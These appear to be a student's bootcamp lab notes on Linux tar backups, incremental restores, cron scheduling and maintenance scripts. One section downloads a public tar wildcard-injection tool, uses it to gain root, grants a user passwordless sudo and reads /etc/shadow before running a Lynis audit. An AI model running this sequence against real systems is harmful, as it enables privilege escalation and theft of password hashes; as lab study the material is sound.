# Week 5.1

## Creating and Restoring Backups with tar

```console
cd ~/Documents/epscript/
ls -l
cd ..
sudo tar cvvWf 20190505epscript.tar epscript/ > 20190505epscript.txt
sudo tar tvvf 20190505epscript.tar | less
cd epscript/backup/
sudo tar tvvf 20190814epscript.tar | less
sudo mkdir patient_search
sudo tar xvvf 20190814epscript.tar -C patient_search/ epscript/patients/
ll patient_search/epscript/patients/
tar xvf 20190814epscript.tar 
grep -R "Mark,Lopez" epscript/
grep -R "Megan,Patel" epscript/
```
An important note when created backups. You cannot be in the the directory you want the backup of. we we cd .. out first.

## Restoring Data Incremental Backups

```console
cd ~/Documents/epscript
tar cvvWf epscript_back_sun.tar --listed-incremental=epscript_backup.snar --level=0 testenvir
tar tvvf epscript_back_sun.tar --incremental | less
rm -r testenvir/patient/
tar xvvf epscript_back_sun.tar -R -C ~/Documents/epscript/ testenvir/patient/
touch patient.0a.txt patient.0b.txt
tar cvvWf epscript_back_mon.tar --listed-incremental=epscript_backup.snar testenvir
tar tvvf epscript_back_mon.tar --incremental | less
```

## Exploiting the tar Command with the Checkpoint and Wildcard Options

```console
cd
sudo su jane
cd ~/Documents
cd ExploitTar
wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py
python wildpwn.py tar .
ls -lat
cd .cache/
ls -lat
./.cachefile
visudo
```
From the exploit we now have root priviledges. As Jane we are able to enter visudo without any priviledge escalations. Within visudo we give ourselves all permissions with jane ALL=(ALL) NOPASSWD:ALL
```console
su jane
sudo cat etc/shadow
sudo rm -rf ~/Documents/ExploitTar
sudo apt install lynis
sudo lynis audit system
sudo nano /var/log/lynis-report.dat
```

# Week 5.2

## Simple Cronjobs
```console
systemctl status cron
sudo mkdir -p /usr/share/{doctors,patients,treatments}
sudo chown root:sysadmin /usr/share/doctors 
sudo chown root:sysadmin /usr/share/patients 
sudo chown root:sysadmin /usr/share/treatments
crontab -e
```
Within the crontab we will add the following lines of code. These lines will move the target docs into their respective folders at 6pm daily.
```console
0 18 * * * mv ~/Downloads/doctors*.docx /usr/share/doctors
0 18 * * * mv ~/Downloads/patients*.txt /usr/share/patients
0 18 * * * mv ~/Downloads/treatments*.pdf /usr/share/treatments
```
Then we will find the cron tab to verify it has been created.
```console
sudo ls -l /var/spool/cron/crontabs | grep sysadmin
```
**Bonus:**
We want a medical archive backup every friday at 11pm, then to verify the backup at 11:05pm, and to create a list of our downloads folder at 4am daily.
```console
0 23 * * 5 tar czvf ~/Documents/MedicalArchive/Medical_backup.tar.gz
5 23 * * 5 gzip -t Medical_backup.tar.gz >> /usr/share/backup_validation.txt
0 4 * * * ls -l ~/Downloads > ~/Documents/Medical_files_list.txt
sudo ls -l /var/spool/cron/crontabs | grep sysadmin
```
## Introduction to Scripts
In this lab we want to create scripts to backup our files, cleanup our caches, and to ensure our packages are all up to date.
```console
mkdir -p ~/Security_scripts
cd ~/Security_scripts
chmod +x backup.sh
chmod +x update.sh
sudo ./backup.sh
sudo ./update.sh
```
**backup.sh**
```console
#!/bin/bash
# Create /var/backup if it doesn't exist
mkdir -p /var/backup
# Create new /var/backup/home.tar
tar cvf /var/backup/home.tar /home
# Moves the file `/var/backup/home.tar` to `/var/backup/home.MMDDYYYY.tar`.
mv /var/backup/home.tar /var/backup/home.01012020.tar
# Creates an archive of `/home`and saves it to `/var/backup/home.tar`.
tar cvf /var/backup/system.tar /home 	
# List all files in `/var/backup`, including file sizes, and save the output to `/var/backup/file_report.txt`.
ls -lh /var/backup > /var/backup/file_report.txt
# Print how much free memory your machine has left. Save this to a file called `/var/backup/disk_report.txt`.
free -h > /var/backup/disk_report.txt
```
**update.sh**
```console
#!/bin/bash
# Ensure apt has all available updates
apt update -y
# Upgrade all installed packages
apt upgrade -y
# Install new packages, and uninstall any old packages that
# must be removed to install them
apt full-upgrade -y
# Remove unused packages and their associated configuration files
apt autoremove --purge -y
# Bonus - Perform with a single line of code.
apt update -y && apt upgrade -y && apt full-upgrade -y && apt-get autoremove --purge -y
```
**cleaup.sh**
```console
#!/bin/bash
# Clean up temp directories
rm -rf /tmp/*
rm -rf /var/tmp/*	
# Clear apt cache
apt clean -y
# Clear thumbnail cache for sysadmin, instructor, and student
rm -rf /home/sysadmin/.cache/thumbnails
rm -rf /home/instructor/.cache/thumbnails
rm -rf /home/student/.cache/thumbnails
rm -rf /root/.cache/thumbnails
```

## Scheduling Backups, Cleanups, and Security Checks



## Reviewing
